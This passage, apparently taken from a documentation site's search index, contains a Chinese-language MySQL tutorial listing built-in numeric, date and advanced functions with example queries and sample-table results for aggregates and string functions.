Price \u7684\u6700\u5c0f\u503c\uff1a SELECT MIN(Price) AS MinPrice FROM Products; MOD(x,y) \u8fd4\u56de x \u9664\u4ee5 y \u4ee5\u540e\u7684\u4f59\u6570 5 \u9664\u4e8e 2 \u7684\u4f59\u6570\uff1a SELECT MOD(5,2) -- 1 PI() \u8fd4\u56de\u5706\u5468\u7387(3.141593\uff09 SELECT PI() --3.141593 POW(x,y) \u8fd4\u56de x \u7684 y \u6b21\u65b9 2 \u7684 3 \u6b21\u65b9\uff1a SELECT POW(2,3) -- 8 POWER(x,y) \u8fd4\u56de x \u7684 y \u6b21\u65b9 2 \u7684 3 \u6b21\u65b9\uff1a SELECT POWER(2,3) -- 8 RADIANS(x) \u5c06\u89d2\u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6 180 \u5ea6\u8f6c\u6362\u4e3a\u5f27\u5ea6\uff1a SELECT RADIANS(180) -- 3.1415926535898 RAND() \u8fd4\u56de 0 \u5230 1 \u7684\u968f\u673a\u6570 SELECT RAND() --0.93099315644334 ROUND(x) \u8fd4\u56de\u79bb x \u6700\u8fd1\u7684\u6574\u6570 SELECT ROUND(1.23456) --1 SIGN(x) \u8fd4\u56de x \u7684\u7b26\u53f7\uff0cx \u662f\u8d1f\u6570\u30010\u3001\u6b63\u6570\u5206\u522b\u8fd4\u56de -1\u30010 \u548c 1 SELECT SIGN(-10) -- (-1) SIN(x) \u6c42\u6b63\u5f26\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT SIN(RADIANS(30)) -- 0.5 SQRT(x) \u8fd4\u56dex\u7684\u5e73\u65b9\u6839 25 \u7684\u5e73\u65b9\u6839\uff1a SELECT SQRT(25) -- 5 SUM(expression) \u8fd4\u56de\u6307\u5b9a\u5b57\u6bb5\u7684\u603b\u548c \u8ba1\u7b97 OrderDetails \u8868\u4e2d\u5b57\u6bb5 Quantity \u7684\u603b\u548c\uff1a SELECT SUM(Quantity) AS TotalItemsOrdered FROM OrderDetails; TAN(x) \u6c42\u6b63\u5207\u503c(\u53c2\u6570\u662f\u5f27\u5ea6) SELECT TAN(1.75); -- -5.52037992250933 TRUNCATE(x,y) \u8fd4\u56de\u6570\u503c x \u4fdd\u7559\u5230\u5c0f\u6570\u70b9\u540e y \u4f4d\u7684\u503c\uff08\u4e0e ROUND \u6700\u5927\u7684\u533a\u522b\u662f\u4e0d\u4f1a\u8fdb\u884c\u56db\u820d\u4e94\u5165\uff09 SELECT TRUNCATE(1.23456,3) -- 1.234 MySQL \u65e5\u671f\u51fd\u6570 \u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b ADDDATE(d,n) \u8ba1\u7b97\u8d77\u59cb\u65e5\u671f d \u52a0\u4e0a n \u5929\u7684\u65e5\u671f SELECT ADDDATE(\"2017-06-15\", INTERVAL 10 DAY); ->2017-06-25 ADDTIME(t,n) n \u662f\u4e00\u4e2a\u65f6\u95f4\u8868\u8fbe\u5f0f\uff0c\u65f6\u95f4 t \u52a0\u4e0a\u65f6\u95f4\u8868\u8fbe\u5f0f n \u52a0 5 \u79d2\uff1a SELECT ADDTIME('2011-11-11 11:11:11', 5); ->2011-11-11 11:11:16 (\u79d2) \u6dfb\u52a0 2 \u5c0f\u65f6, 10 \u5206\u949f, 5 \u79d2: SELECT ADDTIME(\"2020-06-15 09:34:21\", \"2:10:5\"); -> 2020-06-15 11:44:26 CURDATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f SELECT CURDATE(); -> 2018-09-19 CURRENT_DATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f SELECT CURRENT_DATE(); -> 2018-09-19 CURRENT_TIME \u8fd4\u56de\u5f53\u524d\u65f6\u95f4 SELECT CURRENT_TIME(); -> 19:59:02 CURRENT_TIMESTAMP() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT CURRENT_TIMESTAMP() -> 2018-09-19 20:57:43 CURTIME() \u8fd4\u56de\u5f53\u524d\u65f6\u95f4 SELECT CURTIME(); -> 19:59:02 DATE() \u4ece\u65e5\u671f\u6216\u65e5\u671f\u65f6\u95f4\u8868\u8fbe\u5f0f\u4e2d\u63d0\u53d6\u65e5\u671f\u503c SELECT DATE(\"2017-06-15\"); -> 2017-06-15 DATEDIFF(d1,d2) \u8ba1\u7b97\u65e5\u671f d1->d2 \u4e4b\u95f4\u76f8\u9694\u7684\u5929\u6570 SELECT DATEDIFF('2001-01-01','2001-02-02') -> -32 DATE_ADD(d\uff0cINTERVAL expr type) \u8ba1\u7b97\u8d77\u59cb\u65e5\u671f d \u52a0\u4e0a\u4e00\u4e2a\u65f6\u95f4\u6bb5\u540e\u7684\u65e5\u671f\uff0ctype \u503c\u53ef\u4ee5\u662f\uff1aMICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH SELECT DATE_ADD(\"2017-06-15\", INTERVAL 10 DAY); -> 2017-06-25 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL 15 MINUTE); -> 2017-06-15 09:49:21 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL -3 HOUR); ->2017-06-15 06:34:21 SELECT DATE_ADD(\"2017-06-15 09:34:21\", INTERVAL -3 MONTH); ->2017-04-15 DATE_FORMAT(d,f) \u6309\u8868\u8fbe\u5f0f f\u7684\u8981\u6c42\u663e\u793a\u65e5\u671f d SELECT DATE_FORMAT('2011-11-11 11:11:11','%Y-%m-%d %r') -> 2011-11-11 11:11:11 AM DATE_SUB(date,INTERVAL expr type) \u51fd\u6570\u4ece\u65e5\u671f\u51cf\u53bb\u6307\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u3002 Orders \u8868\u4e2d OrderDate \u5b57\u6bb5\u51cf\u53bb 2 \u5929\uff1a SELECT OrderId,DATE_SUB(OrderDate,INTERVAL 2 DAY) AS OrderPayDate FROM Orders DAY(d) \u8fd4\u56de\u65e5\u671f\u503c d \u7684\u65e5\u671f\u90e8\u5206 SELECT DAY(\"2017-06-15\"); -> 15 DAYNAME(d) \u8fd4\u56de\u65e5\u671f d \u662f\u661f\u671f\u51e0\uff0c\u5982 Monday,Tuesday SELECT DAYNAME('2011-11-11 11:11:11') ->Friday DAYOFMONTH(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u6708\u7684\u7b2c\u51e0\u5929 SELECT DAYOFMONTH('2011-11-11 11:11:11') ->11 DAYOFWEEK(d) \u65e5\u671f d \u4eca\u5929\u662f\u661f\u671f\u51e0\uff0c1 \u661f\u671f\u65e5\uff0c2 \u661f\u671f\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8 SELECT DAYOFWEEK('2011-11-11 11:11:11') ->6 DAYOFYEAR(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u5929 SELECT DAYOFYEAR('2011-11-11 11:11:11') ->315 EXTRACT(type FROM d) \u4ece\u65e5\u671f d \u4e2d\u83b7\u53d6\u6307\u5b9a\u7684\u503c\uff0ctype \u6307\u5b9a\u8fd4\u56de\u7684\u503c\u3002 type\u53ef\u53d6\u503c\u4e3a\uff1a MICROSECONDSECONDMINUTEHOURDAYWEEKMONTHQUARTERYEARSECOND_MICROSECONDMINUTE_MICROSECONDMINUTE_SECONDHOUR_MICROSECONDHOUR_SECONDHOUR_MINUTEDAY_MICROSECONDDAY_SECONDDAY_MINUTEDAY_HOURYEAR_MONTH SELECT EXTRACT(MINUTE FROM '2011-11-11 11:11:11') -> 11 FROM_DAYS(n) \u8ba1\u7b97\u4ece 0000 \u5e74 1 \u6708 1 \u65e5\u5f00\u59cb n \u5929\u540e\u7684\u65e5\u671f SELECT FROM_DAYS(1111) -> 0003-01-16 HOUR(t) \u8fd4\u56de t \u4e2d\u7684\u5c0f\u65f6\u503c SELECT HOUR('1:2:3') -> 1 LAST_DAY(d) \u8fd4\u56de\u7ed9\u7ed9\u5b9a\u65e5\u671f\u7684\u90a3\u4e00\u6708\u4efd\u7684\u6700\u540e\u4e00\u5929 SELECT LAST_DAY(\"2017-06-20\"); -> 2017-06-30 LOCALTIME() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT LOCALTIME() -> 2018-09-19 20:57:43 LOCALTIMESTAMP() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT LOCALTIMESTAMP() -> 2018-09-19 20:57:43 MAKEDATE(year, day-of-year) \u57fa\u4e8e\u7ed9\u5b9a\u53c2\u6570\u5e74\u4efd year \u548c\u6240\u5728\u5e74\u4e2d\u7684\u5929\u6570\u5e8f\u53f7 day-of-year \u8fd4\u56de\u4e00\u4e2a\u65e5\u671f SELECT MAKEDATE(2017, 3); -> 2017-01-03 MAKETIME(hour, minute, second) \u7ec4\u5408\u65f6\u95f4\uff0c\u53c2\u6570\u5206\u522b\u4e3a\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2 SELECT MAKETIME(11, 35, 4); -> 11:35:04 MICROSECOND(date) \u8fd4\u56de\u65e5\u671f\u53c2\u6570\u6240\u5bf9\u5e94\u7684\u5fae\u79d2\u6570 SELECT MICROSECOND(\"2017-06-20 09:34:00.000023\"); -> 23 MINUTE(t) \u8fd4\u56de t \u4e2d\u7684\u5206\u949f\u503c SELECT MINUTE('1:2:3') -> 2 MONTHNAME(d) \u8fd4\u56de\u65e5\u671f\u5f53\u4e2d\u7684\u6708\u4efd\u540d\u79f0\uff0c\u5982 November SELECT MONTHNAME('2011-11-11 11:11:11') -> November MONTH(d) \u8fd4\u56de\u65e5\u671fd\u4e2d\u7684\u6708\u4efd\u503c\uff0c1 \u5230 12 SELECT MONTH('2011-11-11 11:11:11') ->11 NOW() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT NOW() -> 2018-09-19 20:57:43 PERIOD_ADD(period, number) \u4e3a \u5e74-\u6708 \u7ec4\u5408\u65e5\u671f\u6dfb\u52a0\u4e00\u4e2a\u65f6\u6bb5 SELECT PERIOD_ADD(201703, 5); -> 201708 PERIOD_DIFF(period1, period2) \u8fd4\u56de\u4e24\u4e2a\u65f6\u6bb5\u4e4b\u95f4\u7684\u6708\u4efd\u5dee\u503c SELECT PERIOD_DIFF(201710, 201703); -> 7 QUARTER(d) \u8fd4\u56de\u65e5\u671fd\u662f\u7b2c\u51e0\u5b63\u8282\uff0c\u8fd4\u56de 1 \u5230 4 SELECT QUARTER('2011-11-11 11:11:11') -> 4 SECOND(t) \u8fd4\u56de t \u4e2d\u7684\u79d2\u949f\u503c SELECT SECOND('1:2:3') -> 3 SEC_TO_TIME(s) \u5c06\u4ee5\u79d2\u4e3a\u5355\u4f4d\u7684\u65f6\u95f4 s \u8f6c\u6362\u4e3a\u65f6\u5206\u79d2\u7684\u683c\u5f0f SELECT SEC_TO_TIME(4320) -> 01:12:00 STR_TO_DATE(string, format_mask) \u5c06\u5b57\u7b26\u4e32\u8f6c\u53d8\u4e3a\u65e5\u671f SELECT STR_TO_DATE(\"August 10 2017\", \"%M %d %Y\"); -> 2017-08-10 SUBDATE(d,n) \u65e5\u671f d \u51cf\u53bb n \u5929\u540e\u7684\u65e5\u671f SELECT SUBDATE('2011-11-11 11:11:11', 1) ->2011-11-10 11:11:11 (\u9ed8\u8ba4\u662f\u5929) SUBTIME(t,n) \u65f6\u95f4 t \u51cf\u53bb n \u79d2\u7684\u65f6\u95f4 SELECT SUBTIME('2011-11-11 11:11:11', 5) ->2011-11-11 11:11:06 (\u79d2) SYSDATE() \u8fd4\u56de\u5f53\u524d\u65e5\u671f\u548c\u65f6\u95f4 SELECT SYSDATE() -> 2018-09-19 20:57:43 TIME(expression) \u63d0\u53d6\u4f20\u5165\u8868\u8fbe\u5f0f\u7684\u65f6\u95f4\u90e8\u5206 SELECT TIME(\"19:30:10\"); -> 19:30:10 TIME_FORMAT(t,f) \u6309\u8868\u8fbe\u5f0f f \u7684\u8981\u6c42\u663e\u793a\u65f6\u95f4 t SELECT TIME_FORMAT('11:11:11','%r') 11:11:11 AM TIME_TO_SEC(t) \u5c06\u65f6\u95f4 t \u8f6c\u6362\u4e3a\u79d2 SELECT TIME_TO_SEC('1:12:00') -> 4320 TIMEDIFF(time1, time2) \u8ba1\u7b97\u65f6\u95f4\u5dee\u503c mysql> SELECT TIMEDIFF(\"13:10:11\", \"13:10:10\"); -> 00:00:01 mysql> SELECT TIMEDIFF('2000:01:01 00:00:00', -> '2000:01:01 00:00:00.000001'); -> '-00:00:00.000001' mysql> SELECT TIMEDIFF('2008-12-31 23:59:59.000001', -> '2008-12-30 01:01:01.000002'); -> '46:58:57.999999' TIMESTAMP(expression, interval) \u5355\u4e2a\u53c2\u6570\u65f6\uff0c\u51fd\u6570\u8fd4\u56de\u65e5\u671f\u6216\u65e5\u671f\u65f6\u95f4\u8868\u8fbe\u5f0f\uff1b\u67092\u4e2a\u53c2\u6570\u65f6\uff0c\u5c06\u53c2\u6570\u52a0\u548c mysql> SELECT TIMESTAMP(\"2017-07-23\", \"13:10:11\"); -> 2017-07-23 13:10:11 mysql> SELECT TIMESTAMP('2003-12-31'); -> '2003-12-31 00:00:00' mysql> SELECT TIMESTAMP('2003-12-31 12:00:00','12:00:00'); -> '2004-01-01 00:00:00' TIMESTAMPDIFF(unit,datetime_expr1,datetime_expr2) \u8ba1\u7b97\u65f6\u95f4\u5dee\uff0c\u8fd4\u56de datetime_expr2 \u2212 datetime_expr1 \u7684\u65f6\u95f4\u5dee mysql> SELECT TIMESTAMPDIFF(DAY,'2003-02-01','2003-05-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5929 -> 89 mysql> SELECT TIMESTAMPDIFF(MONTH,'2003-02-01','2003-05-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u6708 -> 3 mysql> SELECT TIMESTAMPDIFF(YEAR,'2002-05-01','2001-01-01'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5e74 -> -1 mysql> SELECT TIMESTAMPDIFF(MINUTE,'2003-02-01','2003-05-01 12:05:55'); // \u8ba1\u7b97\u4e24\u4e2a\u65f6\u95f4\u76f8\u9694\u591a\u5c11\u5206\u949f -> 128885 TO_DAYS(d) \u8ba1\u7b97\u65e5\u671f d \u8ddd\u79bb 0000 \u5e74 1 \u6708 1 \u65e5\u7684\u5929\u6570 SELECT TO_DAYS('0001-01-01 01:01:01') -> 366 WEEK(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u8303\u56f4\u662f 0 \u5230 53 SELECT WEEK('2011-11-11 11:11:11') -> 45 WEEKDAY(d) \u65e5\u671f d \u662f\u661f\u671f\u51e0\uff0c0 \u8868\u793a\u661f\u671f\u4e00\uff0c1 \u8868\u793a\u661f\u671f\u4e8c SELECT WEEKDAY(\"2017-06-15\"); -> 3 WEEKOFYEAR(d) \u8ba1\u7b97\u65e5\u671f d \u662f\u672c\u5e74\u7684\u7b2c\u51e0\u4e2a\u661f\u671f\uff0c\u8303\u56f4\u662f 0 \u5230 53 SELECT WEEKOFYEAR('2011-11-11 11:11:11') -> 45 YEAR(d) \u8fd4\u56de\u5e74\u4efd SELECT YEAR(\"2017-06-15\"); -> 2017 YEARWEEK(date, mode) \u8fd4\u56de\u5e74\u4efd\u53ca\u7b2c\u51e0\u5468\uff080\u523053\uff09\uff0cmode \u4e2d 0 \u8868\u793a\u5468\u5929\uff0c1\u8868\u793a\u5468\u4e00\uff0c\u4ee5\u6b64\u7c7b\u63a8 SELECT YEARWEEK(\"2017-06-15\"); -> 201724 MySQL \u9ad8\u7ea7\u51fd\u6570 \u51fd\u6570\u540d \u63cf\u8ff0 \u5b9e\u4f8b BIN(x) \u8fd4\u56de x \u7684\u4e8c\u8fdb\u5236\u7f16\u7801 15 \u7684 2 \u8fdb\u5236\u7f16\u7801: SELECT BIN(15); -- 1111 BINARY(s) \u5c06\u5b57\u7b26\u4e32 s \u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 SELECT BINARY \"RUNOOB\"; -> RUNOOB CASE expression WHEN condition1 THEN result1 WHEN condition2 THEN result2 ... WHEN conditionN THEN resultN ELSE result END CASE \u8868\u793a\u51fd\u6570\u5f00\u59cb\uff0cEND \u8868\u793a\u51fd\u6570\u7ed3\u675f\u3002\u5982\u679c condition1 \u6210\u7acb\uff0c\u5219\u8fd4\u56de result1, \u5982\u679c condition2 \u6210\u7acb\uff0c\u5219\u8fd4\u56de result2\uff0c\u5f53\u5168\u90e8\u4e0d\u6210\u7acb\u5219\u8fd4\u56de result\uff0c\u800c\u5f53\u6709\u4e00\u4e2a\u6210\u7acb\u4e4b\u540e\uff0c\u540e\u9762\u7684\u5c31\u4e0d\u6267\u884c\u4e86\u3002 SELECT CASE \u3000WHEN 1 > 0 \u3000THEN '1 > 0' \u3000WHEN 2 > 0 \u3000THEN '2 > 0' \u3000ELSE '3 > 0' \u3000END ->1 > 0 CAST(x AS type) \u8f6c\u6362\u6570\u636e\u7c7b\u578b \u5b57\u7b26\u4e32\u65e5\u671f\u8f6c\u6362\u4e3a\u65e5\u671f\uff1a SELECT CAST(\"2017-08-29\" AS DATE); -> 2017-08-29 COALESCE(expr1, expr2, ...., expr_n) \u8fd4\u56de\u53c2\u6570\u4e2d\u7684\u7b2c\u4e00\u4e2a\u975e\u7a7a\u8868\u8fbe\u5f0f\uff08\u4ece\u5de6\u5411\u53f3\uff09 SELECT COALESCE(NULL, NULL, NULL, 'runoob.com', NULL, 'google.com'); -> runoob.com CONNECTION_ID() \u8fd4\u56de\u552f\u4e00\u7684\u8fde\u63a5 ID SELECT CONNECTION_ID(); -> 4292835 CONV(x,f1,f2) \u8fd4\u56de f1 \u8fdb\u5236\u6570\u53d8\u6210 f2 \u8fdb\u5236\u6570 SELECT CONV(15, 10, 2); -> 1111 CONVERT(s USING cs) \u51fd\u6570\u5c06\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u96c6\u53d8\u6210 cs SELECT CHARSET('ABC') ->utf-8 SELECT CHARSET(CONVERT('ABC' USING gbk)) ->gbk CURRENT_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT CURRENT_USER(); -> guest@% DATABASE() \u8fd4\u56de\u5f53\u524d\u6570\u636e\u5e93\u540d SELECT DATABASE(); -> runoob IF(expr,v1,v2) \u5982\u679c\u8868\u8fbe\u5f0f expr \u6210\u7acb\uff0c\u8fd4\u56de\u7ed3\u679c v1\uff1b\u5426\u5219\uff0c\u8fd4\u56de\u7ed3\u679c v2\u3002 SELECT IF(1 > 0,'\u6b63\u786e','\u9519\u8bef') ->\u6b63\u786e IFNULL(v1,v2) \u5982\u679c v1 \u7684\u503c\u4e0d\u4e3a NULL\uff0c\u5219\u8fd4\u56de v1\uff0c\u5426\u5219\u8fd4\u56de v2\u3002 SELECT IFNULL(null,'Hello Word') ->Hello Word ISNULL(expression) \u5224\u65ad\u8868\u8fbe\u5f0f\u662f\u5426\u4e3a NULL SELECT ISNULL(NULL); ->1 LAST_INSERT_ID() \u8fd4\u56de\u6700\u8fd1\u751f\u6210\u7684 AUTO_INCREMENT \u503c SELECT LAST_INSERT_ID(); ->6 NULLIF(expr1, expr2) \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u5b57\u7b26\u4e32 expr1 \u4e0e expr2 \u76f8\u7b49 \u8fd4\u56de NULL\uff0c\u5426\u5219\u8fd4\u56de expr1 SELECT NULLIF(25, 25); -> SESSION_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT SESSION_USER(); -> guest@% SYSTEM_USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT SYSTEM_USER(); -> guest@% USER() \u8fd4\u56de\u5f53\u524d\u7528\u6237 SELECT USER(); -> guest@% VERSION() \u8fd4\u56de\u6570\u636e\u5e93\u7684\u7248\u672c\u53f7 SELECT VERSION() -> 5.6.34","title":"\u51fd\u6570"},{"location":"database/mysql/function/#_1","text":"","title":"\u51fd\u6570"},{"location":"database/mysql/function/#_2","text":"","title":"\u4e3e\u4f8b"},{"location":"database/mysql/function/#_3","text":"\u200b 1\u3001\u67e5\u770b\u5f53\u524d\u65f6\u95f4 mysql> select current_time(); mysql> select curtime(); \u200b 2\u3001\u67e5\u770b\u5f53\u524d\u65e5\u671f mysql> select current_date(); mysql> select curdate(); \u200b 3\u3001\u67e5\u770b\u5f53\u524d\u7684\u7cfb\u7edf\u65f6\u95f4 mysql> select now(); mysql> select sysdate();","title":"\u4e00\u3001\u65f6\u95f4\u51fd\u6570"},{"location":"database/mysql/function/#_4","text":"\u6c42\u548c sum(\u5b57\u6bb5\u540d) \u6c42\u5e73\u5747\u503c avg(\u5b57\u6bb5\u540d) \u6c42\u6700\u5927\u503c max(\u5b57\u6bb5\u540d) \u6c42\u6700\u5c0f\u503c min(\u5b57\u6bb5\u540d) \u7edf\u8ba1\u5339\u914d\u884c\u6570 count(\u5b57\u6bb5\u540d) count(*)\uff1a\u7528\u4e8e\u7edf\u8ba1\u8868\u4e2d\u6709\u591a\u5c11\u6761\u8bb0\u5f55 \u51c6\u5907\u73af\u5883 mysql> create table score (sno int,sname char(10),ule int,ula int,uoa int); mysql> insert into score values(1,'tom',70,80,90),(2,'mary',55,75,65),(3,'jack',75,45,95),(4,'mike',90,100,86); mysql> select * from score; +------+-------+------+------+------+ | sno | sname | ule | ula | uoa | +------+-------+------+------+------+ | 1 | tom | 70 | 80 | 90 | | 2 | mary | 55 | 75 | 65 | | 3 | jack | 75 | 45 | 95 | | 4 | mike | 90 | 100 | 86 | +------+-------+------+------+------+ 4 rows in set (0.01 sec) \u663e\u793aule\u6700\u9ad8\u5206\uff0cula\u6700\u4f4e\u5206 mysql> select max(ule),min(ula) from score; +----------+----------+ | max(ule) | min(ula) | +----------+----------+ | 90 | 45 | +----------+----------+ 1 row in set (0.01 sec) -------------------------------------------------- \u5217\u7684\u522b\u540d \u5199\u6cd5\uff1a\u5217\u540d [as] \u522b\u540d mysql> select max(ule) mule,min(ula) as mula from score; //\u7ed9\u5217\u8d77\u522b\u540d +------+------+ | mule | nula | +------+------+ | 90 | 45 | +------+------+ -------------------------------------------------- \u7edf\u8ba1\u8868\u4e2d\u7684\u884c\u6570(\u8bb0\u5f55\u6570) mysql> select count(*) from score; +----------+ | count(*) | +----------+ | 4 | +----------+ 1 row in set (0.00 sec) mysql> insert into score values(); mysql> select count(sno) from score; //\u5ffd\u7565\u7a7a\u503c +------------+ | count(sno) | +------------+ | 4 | +------------+ 1 row in set (0.00 sec) mysql> delete from score where sno is null; //\u5c06sno\u5b57\u6bb5\u4e3a\u7a7a\u7684\u884c\u5220\u9664\u6389 is null\uff1a\u7528\u6765\u5339\u914d\u7a7a\u7684 is not null\uff1a\u5339\u914d\u975e\u7a7a\u7684 \u8ba1\u7b97ula\u7684\u5e73\u5747\u6210\u7ee9 mysql> select avg(ula) from score; +----------+ | avg(ula) | +----------+ | 75.0000 | +----------+ 1 row in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e00\u79d1\u7684\u603b\u6210\u7ee9 mysql> select sum(ule),sum(ula),sum(uoa) from score; +----------+----------+----------+ | sum(ule) | sum(ula) | sum(uoa) | +----------+----------+----------+ | 290 | 300 | 336 | +----------+----------+----------+ 1 row in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e2a\u5b66\u751f\u7684\u59d3\u540d\u548c\u603b\u6210\u7ee9 mysql> select sname,ule+ula+uoa total from score; //select\u540e\u9762\u53ef\u4ee5\u52a0\u7b97\u6570\u8868\u8fbe\u5f0f +-------+-------+ | sname | total | +-------+-------+ | tom | 240 | | mary | 195 | | jack | 215 | | mike | 276 | +-------+-------+ 4 rows in set (0.00 sec) \u67e5\u8be2\u6bcf\u4e2a\u5b66\u751f\u7684\u59d3\u540d\u548c\u5e73\u5747\u6210\u7ee9 mysql> select sname,(ule+ula+uoa)/3 ave from score; +-------+---------+ | sname | ave | +-------+---------+ | tom | 80.0000 | | mary | 65.0000 | | jack | 71.6667 | | mike | 92.0000 | +-------+---------+ 4 rows in set (0.00 sec)","title":"\u4e8c\u3001\u805a\u5408\u51fd\u6570"},{"location":"database/mysql/function/#_5","text":"1\u3001\u8fde\u63a5\u51fd\u6570 concat() concatnate\uff1a\u8fde\u63a5 mysql> select concat(sno,sname) from score; +-------------------+ | concat(sno,sname) | +-------------------+ | 1tom | | 2mary | | 3jack | | 4mike | +-------------------+ 4 rows in set (0.00 sec) mysql> select concat(sno,' ',sname) from score; //\u5355\u5f15\u53f7\u4e2d\u95f4\u662f\u5b57\u7b26\u4e32 2\u3001upper() \u8f6c\u6362\u6210\u5927\u5199 \u200b lower() \u8f6c\u6362\u6210\u5c0f\u5199 mysql> select sname,upper(sname) from score; +-------+--------------+ | sname | upper(sname) | +-------+--------------+ | tom | TOM | | mary | MARY | | jack | JACK | | mike | MIKE | +-------+--------------+ 4 rows in set (0.02 sec) mysql> select upper('dsadas'); +-----------------+ | upper('dsadas') | +-----------------+ | DSADAS | +-----------------+ 1 row in set (0.00 sec) 3\u3001\u6c42\u957f\u5ea6 length() mysql> select length('dadasdasfdswdredgcdf'); +--------------------------------+ | length('dadasdasfdswdredgcdf') | +--------------------------------+ | 20 | +--------------------------------+ 1 row in set (0.02 sec) mysql> select sname,length(sname) from score; +-------+---------------+ | sname | length(sname) | +-------+---------------+ | tom | 3 | | mary | 4 | | jack | 4 | | mike | 4 | +-------+---------------+ 4 rows in set (0.01 sec) MySQL \u6709\u5f88\u591a\u5185\u7f6e\u7684\u51fd\u6570\uff0c\u4ee5\u4e0b\u5217\u51fa\u4e86\u8fd9\u4e9b\u51fd\u6570\u7684\u8bf4\u660e\u3002","title":"\u4e09\u3001\u5176\u5b83\u51fd\u6570"},{"location":"database/mysql/function/#mysql","text":"\u51fd\u6570 \u63cf\u8ff0 \u5b9e\u4f8b ASCII(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u7684 ASCII \u7801\u3002 \u8fd4\u56de CustomerName \u5b57\u6bb5\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u7684 ASCII \u7801\uff1a SELECT ASCII(CustomerName) AS NumCodeOfFirstChar FROM Customers; CHAR_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u6570 \u8fd4\u56de\u5b57\u7b26\u4e32 RUNOOB \u7684\u5b57\u7b26\u6570 SELECT CHAR_LENGTH(\"RUNOOB\") AS LengthOfString; CHARACTER_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 s \u7684\u5b57\u7b26\u6570\uff0c\u7b49\u540c\u4e8e CHAR_LENGTH(s) \u8fd4\u56de\u5b57\u7b26\u4e32 RUNOOB \u7684\u5b57\u7b26\u6570 SELECT CHARACTER_LENGTH(\"RUNOOB\") AS LengthOfString; CONCAT(s1,s2...sn) \u5b57\u7b26\u4e32 s1,s2 \u7b49\u591a\u4e2a\u5b57\u7b26\u4e32\u5408\u5e76\u4e3a\u4e00\u4e2a\u5b57\u7b26\u4e32 \u5408\u5e76\u591a\u4e2a\u5b57\u7b26\u4e32 SELECT CONCAT(\"SQL \", \"Runoob \", \"Gooogle \", \"Facebook\") AS ConcatenatedString; CONCAT_WS(x, s1,s2...sn) \u540c CONCAT(s1,s2,...) \u51fd\u6570\uff0c\u4f46\u662f\u6bcf\u4e2a\u5b57\u7b26\u4e32\u4e4b\u95f4\u8981\u52a0\u4e0a x\uff0cx \u53ef\u4ee5\u662f\u5206\u9694\u7b26 \u5408\u5e76\u591a\u4e2a\u5b57\u7b26\u4e32\uff0c\u5e76\u6dfb\u52a0\u5206\u9694\u7b26\uff1a SELECT CONCAT_WS(\"-\", \"SQL\", \"Tutorial\", \"is\", \"fun!\")AS ConcatenatedString; FIELD(s,s1,s2...) \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32 s \u5728\u5b57\u7b26\u4e32\u5217\u8868(s1,s2...)\u4e2d\u7684\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 c \u5728\u5217\u8868\u503c\u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT FIELD(\"c\", \"a\", \"b\", \"c\", \"d\", \"e\"); FIND_IN_SET(s1,s2) \u8fd4\u56de\u5728\u5b57\u7b26\u4e32s2\u4e2d\u4e0es1\u5339\u914d\u7684\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e \u8fd4\u56de\u5b57\u7b26\u4e32 c \u5728\u6307\u5b9a\u5b57\u7b26\u4e32\u4e2d\u7684\u4f4d\u7f6e\uff1a SELECT FIND_IN_SET(\"c\", \"a,b,c,d,e\"); FORMAT(x,n) \u51fd\u6570\u53ef\u4ee5\u5c06\u6570\u5b57 x \u8fdb\u884c\u683c\u5f0f\u5316 \"#,###.##\", \u5c06 x \u4fdd\u7559\u5230\u5c0f\u6570\u70b9\u540e n \u4f4d\uff0c\u6700\u540e\u4e00\u4f4d\u56db\u820d\u4e94\u5165\u3002 \u683c\u5f0f\u5316\u6570\u5b57 \"#,###.##\" \u5f62\u5f0f\uff1a SELECT FORMAT(250500.5634, 2); -- 